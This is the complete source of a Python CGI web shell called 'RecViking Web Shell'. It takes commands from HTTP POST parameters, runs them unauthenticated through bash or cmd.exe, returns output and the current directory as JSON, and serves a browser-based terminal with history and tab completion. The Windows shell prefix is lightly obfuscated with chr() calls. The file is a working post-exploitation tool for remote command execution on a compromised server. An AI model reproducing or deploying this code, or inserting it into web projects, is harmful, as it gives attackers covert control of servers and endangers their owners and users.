#!/usr/bin/python3
import sys
import os
import subprocess
import json
try:
    import urllib.parse as ulib
except ImportError:
    import urllib as ulib

pdata = sys.stdin.read()
pdata = pdata.split('&')
c = ""
t = ""
cwd = ""
for tmpvar in pdata:
    tmptmpvar = tmpvar.split('=',2)
    if len(tmptmpvar) == 2:
        if tmptmpvar[0] == 'c':
            c = ulib.unquote_plus(tmptmpvar[1])
        elif tmptmpvar[0] == 'cwd':
            cwd = ulib.unquote_plus(tmptmpvar[1])
        elif tmptmpvar[0] == 't':
            t = ulib.unquote_plus(tmptmpvar[1])
        else:
            pass
prewin = chr(37) + chr(67) + chr(111) + chr(109) + chr(83) + chr(112) + chr(101) + chr(99) + chr(37) + chr(32) + chr(47) + chr(99) + chr(32)
prelin = "/usr/bin/bash"
pre = ""
needquotes = ""
pwdcmd = ""
cdcmd = ""
prec = ""

if cwd == "":
    cwd = os.getcwd()

if os.path.isdir('c:\\'):
    pre = prewin
    prec = '/c'
    pwdcmd = " & cd"
    cdcmd = 'cd "{}" & '.format(cwd)
else:
    pre = prelin
    prec = '-c'
    pwdcmd = " ; pwd ; "
    cdcmd = 'cd "{}" ; '.format(cwd)
    needquotes = "\""

if c != "":
    c = cdcmd + c + pwdcmd
    procpipes = subprocess.Popen([pre, prec, c], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
    sr = procpipes[0].decode("utf-8")
    er = procpipes[1].decode("utf-8")
    sr = sr.replace(chr(13), '')
    er = er.replace(chr(13), '')
    sr = sr.strip('\n')
    er = er.strip('\n')
    if sr.find('\n') == -1:
        cwd = sr
        sr = ""
    else:
        cwd = sr.split('\n')
        cwd = cwd[len(cwd) - 1]
        sr = '\n'.join(sr.split('\n')[:-1])
    print("Content-type: application/json\r\n\r\n")
    print(json.dumps({"error": None, "stdout" : sr, "stderr" : er, "cwd" : cwd, "debug_c" : c}))
elif t != "":
    t = t.split(' ')

    sr = ""
    er = ""
    c_debug = []

    for i in reversed(range(len(t))):
        tmpt = ' '.join(t[i:])
        if(pre == prewin):
            c = "dir /B \"" + tmpt + "*\""
        else:
            if tmpt.find('/') != -1:
                rd = ''
                if tmpt.find('/') == 0:
                    rd = '/'
                tmpdirs = tmpt.split('/')
                if len(tmpdirs) > 1 and tmpdirs[-1] != "":
                    path_tmpt = "/".join(tmpdirs[:-1])
                    tmpt = (tmpdirs[-1]).replace('"', '\\"')
                    safetmpt = tmpt.replace("\\", "\\\\").replace("\"","\\\"").replace(".", "\\.").replace("[", "\\[").replace("(", "\\(")
                    c = "ls \"" + rd + path_tmpt + "\" | grep -i -e \"^" + safetmpt + "\";"
                else:
                    c = "ls \"" + tmpt + "\";"
            else:
                safetmpt = tmpt.replace("\\", "\\\\").replace("\"","\\\"").replace(".", "\\.").replace("[", "\\[").replace("(", "\\(")
                c = "ls | grep -i -e \"" + safetmpt + "\";"
        c = cdcmd + c
        c_debug.append(c)
        procpipes = subprocess.Popen([pre, prec, c], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
        sr = sr + '\n' + procpipes[0].decode("utf-8")
        er = procpipes[1].decode("utf-8")
    
    sr = sr.replace(chr(13), '')
    er = er.replace(chr(13), '')
    while sr.find('\n\n') != -1 and sr[-1] != ' ':
        sr = sr.replace('\n\n', '\n').strip()
    sr = sr.strip('\n')
    if pre == prelin:
        sr = sr.replace(' ', '\\ ')
    sr = list(dict.fromkeys(sr.split('\n')))
    er = er.strip('\n')
    if sr != "":
        er = ""
    
    print("Content-type: application/json\r\n\r\n")
    print(json.dumps({"stdout": sr, "stderr": er, "debug_commands": c_debug, "error": None}))
else:
    print("Content-type: text/html\r\n\r\n")
    htmlgui = '''<!doctype html><html lang=en>
<head>
        <meta charset='utf-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'>
	<title>RecViking Web Shell</title>
	<link rel='stylesheet' href='https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css'>
	<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'></script>
	<script src='https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js'></script>
	<script>localStorage.setItem('cmdHistory', JSON.stringify([])); localStorage.setItem('cmdCurrent', '');localStorage.setItem('cwd', ''); localStorage.setItem('cmdIndex', 0);</script>
	<script>function unscrew(inval){
        var outval;
        outval = inval.replace(/\\n/gm,String.fromCharCode(10)).replace(/\\r/gm,String.fromCharCode(13)).replace(/\\t/g,String.fromCharCode(9)).replace(/\\\\/g,String.fromCharCode(92));
        return outval;
        }</script>
	<script>
        function promptCheck() {
            if (document.getElementById('cmdin').value.charAt(0) != String.fromCharCode(62)){
                document.getElementById('cmdin').value=String.fromCharCode(62).concat(document.getElementById('cmdin').value);
            };
        }</script>
	<script>
        function runcmd(cmdVal) {
            var tmparr = JSON.parse(localStorage.cmdHistory);
            if(tmparr[tmparr.length - 1] != cmdVal){
                tmparr.push(cmdVal)
            }
            localStorage.cmdHistory = JSON.stringify(tmparr);
            localStorage.cmdIndex = 0;
            localStorage.cmdCurrent = cmdVal;
            $.post(window.location.href, {c: cmdVal, cwd: localStorage.cwd}, function(data){
                if(data['error'] == null || typeof(data['error']) == 'undefined' || data['error'] == ""){
                    if(data['stdout']){
                        document.getElementById('cmdout').innerHTML += '<pre>' + unscrew(data['stdout']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';
                    }
                    if(data['stderr']){
                        document.getElementById('cmdout').innerHTML += \"<pre style='color: red;'>\" + unscrew(data['stderr']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';
                    }
                    $('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);
                    document.getElementById('cwd').innerHTML = data['cwd'];
                    localStorage.cwd=data['cwd'];
                }else{
                    document.getElementById('cmdout').innerHTML += \"<pre style='color: red;'>\" + unscrew(data['error']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);
                }
            });
        }
        </script>
        <script>
        function tabcomplete() {
            var cmdtmp = document.getElementById('cmdin').value.substring(1);
            $.post(window.location.href, {t: cmdtmp, cwd: localStorage.cwd}, function(data){
                if(data['error'] == null && data['stderr'] == ''){
                    if(data['stdout'].length == 1){
                        var str = document.getElementById('cmdin').value.toLowerCase();
                        var str2 = data['stdout'][0].toLowerCase();
                        var lms = '';
                        for(var i = 1;i <= str2.length;i++){
                            var tmpsec = str2.substring(0,i);
                            if(str.includes(tmpsec, str.length - tmpsec.length)){
                                lms = tmpsec;
                            }
                        }
                        document.getElementById('cmdin').value += (data['stdout'][0].substring(lms.length));
                    }
                    document.getElementById('cmdout').innerHTML += \"<pre style='color: gray'>\" + data['stdout'] + \"</pre>\";
                    $('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);
                }else{
                    document.getElementById('cmdout').innerHTML += \"<pre style='color: gray'>\" +  'tab completion failed: ' + data['error'] + \"</pre>\";
                    $('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);
                }
            });
        }
        </script>
	<style>
	#mainwin { width: 800px; height: 600px; padding: 0.5em; background-color: black;}
	#mainwin h3 { text-align: center; margin: 0; }
        </style>
	</head>
        <body> 
	<div id='mainwin'> 
	<h3 class='ui-widget-header'>RecViking Web Shell (<span id='cwd'></span>)</h3>
	<div style='width: 100%; float: left; background-color: black; color: white;'>
	<div id='cmdout' style='float: left; width: 100%; background-color: black; color: white; height: 560px; overflow-y: scroll; overflow-x: hidden'></div>
	<input type='text'id='cmdin' style='float: left; background-color: black; color: white; width: 100%; border: 0px; padding 0px;' onchange='promptCheck()' oninput='promptCheck()' value='>'></input>
	<script>
        document.getElementById('cmdin').addEventListener('keyup', function(event){
            if(event.keyCode === 13){
                var cmdvar=document.getElementById('cmdin').value.substr(1);
                document.getElementById('cmdout').innerHTML += '<pre>' + document.getElementById('cmdin').value.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';
                document.getElementById('cmdin').value='>';
                $('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);
                runcmd(cmdvar);
            }else if(event.keyCode === 38){
                if(parseInt(localStorage.cmdIndex) == 0){
                    localStorage.cmdCurrent = document.getElementById('cmdin').value.substr(1);
                }
                localStorage.cmdIndex = parseInt(localStorage.cmdIndex) + 1;
                if(parseInt(localStorage.cmdIndex) <= JSON.parse(localStorage.cmdHistory).length){
                    document.getElementById('cmdin').value = '>' + JSON.parse(localStorage.cmdHistory)[JSON.parse(localStorage.cmdHistory).length - parseInt(localStorage.cmdIndex)];
                }else{
                    localStorage.cmdIndex = parseInt(localStorage.cmdIndex) - 1;
                }
            }else if(event.keyCode === 40){
                localStorage.cmdIndex = parseInt(localStorage.cmdIndex) - 1;
                if(parseInt(localStorage.cmdIndex) <= 0){
                    document.getElementById('cmdin').value = '>' + localStorage.cmdCurrent;
                    localStorage.cmdIndex = 0;
                }else{
                    document.getElementById('cmdin').value = '>' + JSON.parse(localStorage.cmdHistory)[JSON.parse(localStorage.cmdHistory).length - parseInt(localStorage.cmdIndex)];
                }
            }
        });
        </script>
	<script>
        document.getElementById('cmdin').addEventListener('keydown', function(event){
            if(event.keyCode === 9){
                event.preventDefault(); tabcomplete();
            }
        });
        </script>
	</div> 
	</div> 
	</body>'''
    print(htmlgui)
